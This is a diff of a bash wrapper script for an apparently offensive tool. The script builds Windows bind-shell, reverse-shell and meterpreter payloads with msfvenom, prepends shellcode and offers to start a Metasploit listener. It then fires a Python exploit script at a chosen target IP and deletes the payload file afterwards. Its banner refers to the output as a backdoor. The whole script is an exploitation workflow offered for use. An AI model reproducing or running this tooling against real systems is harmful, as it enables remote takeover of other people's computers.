@@ -37,26 +37,24 @@ echo -ne $okegreen "  Set target ip : "
 read targetip
 echo -ne $okegreen "  Set target architecture (x64/x86) : "
 read targetarch
-echo -ne $okegreen "  Set a filename : "
-read filename
+echo -ne $okegreen "  Name a payload : "
+read pldname
 clear
 menu
 }
 function pldgen {
-echo -ne $orange " Check payload configuration before complining "
-read fgd
+echo -e $orange " Check payload configuration before complining "
+sleep 2
 echo -ne $orange " Set an exploit to be used (exploit7(8).py) : "
 read exploitvers
-echo -ne $okegreen "  Name you payload : "
-read pldname
-msfvenom -p $payload -f raw -o $pldname.bin EXITFUNC=thread LHOST=$localip LPORT=$localport
-cat scripts/shellcode_$targetarch $pldname.bin > $pldname.f.bin
+msfvenom -p tmp/$payload -f raw -o $pldname.bin EXITFUNC=thread LHOST=$localip LPORT=$localport
+cat scripts/shellcode_$targetarch tmp/$pldname.bin > tmp/$pldname.f.bin
 pldname=$pldname.f
 echo -e $orange "  Would you like to start msf listener now ? (y/n)"
 read qawsed
 case $qawsed in
 y|Y|Yes|yes|YES)
-xterm msfconsole -r tmp/listener.rc
+#gnome-terminal msfconsole -r tmp/listener.rc
 ;;
 n|no|No|NO)
 echo -e $orange "  After generating, write in terminal: msfconsole -r path/to/listener/*name*.rc"
@@ -75,7 +73,7 @@ cat << !
   +------------++-------------------------++-----------------------+
   | LHOST      ||  The Listen Addres      || $localip
   | LPORT      ||  The Listen Ports       || $localport
-  | OUTPUTNAME ||  The Filename output    || $filename
+  | OUTPUTNAME ||  The Filename output    || $pldname
   | PAYLOAD    ||  Payload To Be Used     || $payload
   +------------++-------------------------++-----------------------+
 
@@ -120,48 +118,48 @@ case $pld in
 1)
 payload="windows/shell_bind_tcp"
 ipaddr_setup
-echo -en $okegreen "  Name a file : "
-read filename
+echo -ne $okegreen "  Name a payload : "
+read pldname
 clear
 menu
 ;;
 2)
 payload="windows/shell/reverse_tcp"
 ipaddr_setup
-echo -en $okegreen "  Name a file : "
-read filename
+echo -ne $okegreen "  Name a payload : "
+read pldname
 clear
 menu
 ;;
 3)
 payload="windows/meterpreter/reverse_tcp"
 ipaddr_setup
-echo -en $okegreen "  Name a file : "
-read filename
+echo -ne $okegreen "  Name a payload : "
+read pldname
 clear
 menu
 ;;
 4)
 payload="windows/meterpreter/reverse_tcp_dns"
 ipaddr_setup
-echo -en $okegreen "  Name a file : "
-read filename
+echo -ne $okegreen "  Name a payload : "
+read pldname
 clear
 menu
 ;;
 5)
 payload="windows/meterpreter/reverse_http"
 ipaddr_setup
-echo -en $okegreen "  Name a file : "
-read filename
+echo -ne $okegreen "  Name a payload : "
+read pldname
 clear
 menu
 ;;
 6)
 payload="windows/meterpreter/reverse_https"
 ipaddr_setup
-echo -en $okegreen "  Name a file : "
-read filename
+echo -ne $okegreen "  Name a payload : "
+read pldname
 clear
 menu
 ;;
@@ -202,7 +200,9 @@ pldgen
 echo -e $BlueF " Is a lisneter started ? "
 sleep 2
 echo -e $red " Everythings is prepared push [ENTER] to start exploitation "
-python scripts/$exploitvers $targetip $pldname.bin 12
+python scripts/$exploitvers $targetip tmp/$pldname.bin 12
+sleep 4
+rm -r tmp/$pldname.bin
 exit 0
 ;;
 5)
@@ -278,7 +278,6 @@ menu
 }
 clear
 echo -e $red""
-echo "                                                                  ";
 echo "=================================================================="
 echo "         WARNING !  WARNING ! WARNING ! WARNING ! WARNING ! "
 echo "    YOU CAN UPLOAD OUTPUT/BACKDOOR FILE TO WWW.NODISTRIBUTE.COM   "
